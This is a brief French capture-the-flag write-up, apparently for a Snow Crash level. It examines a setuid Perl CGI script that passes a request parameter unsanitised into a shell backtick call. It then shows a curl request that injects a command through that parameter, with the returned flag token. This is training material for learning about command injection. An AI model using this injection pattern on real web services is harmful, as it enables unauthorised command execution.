```bash
$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

Tiens donc... encore un fichier avec le s-bit. On va l'examiner.

```bash
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Ce script perl est execute lors d'une requete HTTP sur le port 4747. Il prend un parametre `x` et l'execute avec la commande `echo`. On peut donc injecter des commandes systeme dans le parametre `x`.

```bash
$ curl 'localhost:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

Magnifique! On a le flag!